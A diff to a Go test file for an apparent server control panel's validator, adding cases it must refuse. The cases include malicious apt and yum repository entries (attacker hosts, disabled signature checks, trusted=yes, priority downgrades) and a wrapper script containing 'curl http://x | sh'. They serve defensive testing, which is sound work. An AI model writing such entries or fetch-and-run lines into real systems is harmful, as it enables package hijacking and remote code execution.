@@ -8,18 +8,20 @@ func TestAptRefusals(t *testing.T) {
 	runRefusals(t, []refusal{
 		{"other host", list, "deb " + nginxKey + " http://evil.example/packages/debian trixie nginx\n", []string{"evil.example"}},
 		{"other path", "/etc/apt/sources.list.d/ondrej-php.list", "deb [signed-by=/etc/apt/keyrings/ondrej-php.asc] https://ppa.launchpadcontent.net/attacker/ppa/ubuntu noble main\n", []string{"attacker"}},
-		{"path walks up", list, "deb " + nginxKey + " http://nginx.org/packages/../evil/ trixie nginx\n", []string{"nginx.org"}},
-		{"trusted", list, "deb [trusted=yes] http://nginx.org/packages/debian trixie nginx\n", []string{"trusted=yes"}},
-		{"insecure", list, "deb [signed-by=/etc/apt/keyrings/nginx.asc allow-insecure=yes] http://nginx.org/packages/debian trixie nginx\n", []string{"allow-insecure"}},
-		{"no keyring", list, "deb http://nginx.org/packages/debian trixie nginx\n", []string{"signed by"}},
-		{"other keyring", list, "deb [signed-by=/etc/apt/keyrings/sury-php.gpg] http://nginx.org/packages/debian trixie nginx\n", []string{"sury-php.gpg"}},
-		{"keyring of the API", list, "deb [signed-by=/var/lib/monopanel/key.gpg] http://nginx.org/packages/debian trixie nginx\n", []string{"/var/lib/monopanel/key.gpg"}},
+		{"plain http", list, "deb " + nginxKey + " http://nginx.org/packages/debian trixie nginx\n", []string{"https"}},
+		{"plain http mysql", "/etc/apt/sources.list.d/mysql.list", "deb [signed-by=/etc/apt/keyrings/mysql.asc] http://repo.mysql.com/apt/debian/ trixie mysql-8.4-lts\n", []string{"https"}},
+		{"path walks up", list, "deb " + nginxKey + " https://nginx.org/packages/../evil/ trixie nginx\n", []string{"nginx.org"}},
+		{"trusted", list, "deb [trusted=yes] https://nginx.org/packages/debian trixie nginx\n", []string{"trusted=yes"}},
+		{"insecure", list, "deb [signed-by=/etc/apt/keyrings/nginx.asc allow-insecure=yes] https://nginx.org/packages/debian trixie nginx\n", []string{"allow-insecure"}},
+		{"no keyring", list, "deb https://nginx.org/packages/debian trixie nginx\n", []string{"signed by"}},
+		{"other keyring", list, "deb [signed-by=/etc/apt/keyrings/sury-php.gpg] https://nginx.org/packages/debian trixie nginx\n", []string{"sury-php.gpg"}},
+		{"keyring of the API", list, "deb [signed-by=/var/lib/monopanel/key.gpg] https://nginx.org/packages/debian trixie nginx\n", []string{"/var/lib/monopanel/key.gpg"}},
 		{"file URI", list, "deb [trusted=yes] file:/var/lib/monopanel/repo ./\n", nil},
 		{"file URI signed", list, "deb " + nginxKey + " file:/var/lib/monopanel/repo ./\n", []string{"file:"}},
 		{"mirror file", list, "deb " + nginxKey + " mirror+file:/var/lib/monopanel/mirrors trixie main\n", []string{"mirror+file"}},
 		{"user in URI", list, "deb " + nginxKey + " http://u:p@nginx.org/packages/debian trixie nginx\n", nil},
-		{"port", list, "deb " + nginxKey + " http://nginx.org:8080/packages/debian trixie nginx\n", nil},
-		{"odd suite", list, "deb " + nginxKey + " http://nginx.org/packages/debian ../../x nginx\n", []string{"../../x"}},
+		{"port", list, "deb " + nginxKey + " https://nginx.org:8080/packages/debian trixie nginx\n", nil},
+		{"odd suite", list, "deb " + nginxKey + " https://nginx.org/packages/debian ../../x nginx\n", []string{"../../x"}},
 		{"deb822", "/etc/apt/sources.list.d/evil.sources", "Types: deb\nURIs: http://evil.example/\nSuites: x\nTrusted: yes\n", []string{"evil.sources"}},
 		{"not a source", list, "Types: deb\n", nil},
 		{"pin downgrade", "/etc/apt/preferences.d/99nginx", "Package: *\nPin: origin nginx.org\nPin-Priority: 1001\n", []string{"1001"}},
@@ -37,12 +39,13 @@ func TestYumRefusals(t *testing.T) {
 	const head = "[nginx-stable]\nname=x\ngpgcheck=1\n"
 	runRefusals(t, []refusal{
 		{"other host", repo, head + "baseurl=https://evil.example/el9/\n", []string{"evil.example"}},
+		{"plain http", repo, head + "baseurl=http://nginx.org/packages/centos/9/$basearch/\n", []string{"over https"}},
 		{"file URL", repo, head + "baseurl=file:///var/lib/monopanel/repo/\n", []string{"file:///var/lib/monopanel/repo/"}},
 		{"other path", "/etc/yum.repos.d/mysql-community.repo", head + "baseurl=https://repo.mysql.com/evil/\n", []string{"repo.mysql.com/evil"}},
-		{"gpgcheck off", repo, "[nginx-stable]\nbaseurl=http://nginx.org/packages/centos/9/$basearch/\ngpgcheck=0\n", []string{"gpgcheck=0"}},
+		{"gpgcheck off", repo, "[nginx-stable]\nbaseurl=https://nginx.org/packages/centos/9/$basearch/\ngpgcheck=0\n", []string{"gpgcheck=0"}},
 		{"pkg_gpgcheck off", repo, head + "pkg_gpgcheck=false\n", []string{"pkg_gpgcheck=false"}},
-		{"no gpgcheck", repo, "[nginx-stable]\nbaseurl=http://nginx.org/packages/centos/9/$basearch/\n", []string{"gpgcheck=1"}},
-		{"second repo without gpgcheck", repo, head + "[other]\nbaseurl=http://nginx.org/packages/centos/9/$basearch/\n", []string{"[other]"}},
+		{"no gpgcheck", repo, "[nginx-stable]\nbaseurl=https://nginx.org/packages/centos/9/$basearch/\n", []string{"gpgcheck=1"}},
+		{"second repo without gpgcheck", repo, head + "[other]\nbaseurl=https://nginx.org/packages/centos/9/$basearch/\n", []string{"[other]"}},
 		{"mirrorlist", repo, head + "mirrorlist=https://evil.example/list\n", []string{"mirrorlist"}},
 		{"metalink", repo, head + "metalink=https://evil.example/m\n", []string{"metalink"}},
 		{"proxy", repo, head + "proxy=http://127.0.0.1:3128\n", []string{"proxy"}},
@@ -51,7 +54,7 @@ func TestYumRefusals(t *testing.T) {
 		{"key from the API", repo, head + "gpgkey=file:///var/lib/monopanel/key\n", []string{"gpgkey"}},
 		{"key from another host", repo, head + "gpgkey=https://evil.example/key\n", []string{"evil.example"}},
 		{"variable host", repo, head + "baseurl=https://$evil/x/\n", nil},
-		{"continued URL", repo, head + "baseurl=http://nginx.org/packages/centos/9/$basearch/\n        https://evil.example/x/\n", []string{"evil.example"}},
+		{"continued URL", repo, head + "baseurl=https://nginx.org/packages/centos/9/$basearch/\n        https://evil.example/x/\n", []string{"evil.example"}},
 		{"not a repo file", "/etc/yum.repos.d/x.conf", head, []string{"x.conf"}},
 		{"dnf config", "/etc/dnf/dnf.conf", "[main]\ngpgcheck=0\n", []string{"/etc/dnf/dnf.conf"}},
 	})
@@ -59,9 +62,11 @@ func TestYumRefusals(t *testing.T) {
 
 func TestPanelFilesRefusals(t *testing.T) {
 	const wrapper = "/usr/local/bin/composer"
-	const head = "#!/bin/sh\n# Generated by MonoPanel: composer on the newest PHP branch the panel installed.\n"
+	const head = "#!/bin/sh\n# Generated by MonoPanel: composer on the newest PHP branch the panel installed.\n" + ComposerRootGuard + "\n"
 	const execLine = "exec /usr/bin/php8.4 /usr/local/lib/monopanel/composer.phar \"$@\"\n"
 	runRefusals(t, []refusal{
+		{"wrapper without the root guard", wrapper, "#!/bin/sh\n" + execLine, []string{"refuses root"}},
+		{"wrapper guard after the exec", wrapper, "#!/bin/sh\n" + execLine + ComposerRootGuard + "\n", []string{"refuses root"}},
 		{"wrapper extra command", wrapper, head + "curl http://x | sh\n" + execLine, []string{"curl"}},
 		{"wrapper other program", wrapper, head + "exec /var/lib/monopanel/x \"$@\"\n", []string{"/var/lib/monopanel/x"}},
 		{"wrapper other phar", wrapper, head + "exec /usr/bin/php8.4 /var/lib/monopanel/composer.phar \"$@\"\n", []string{"/var/lib/monopanel/composer.phar"}},
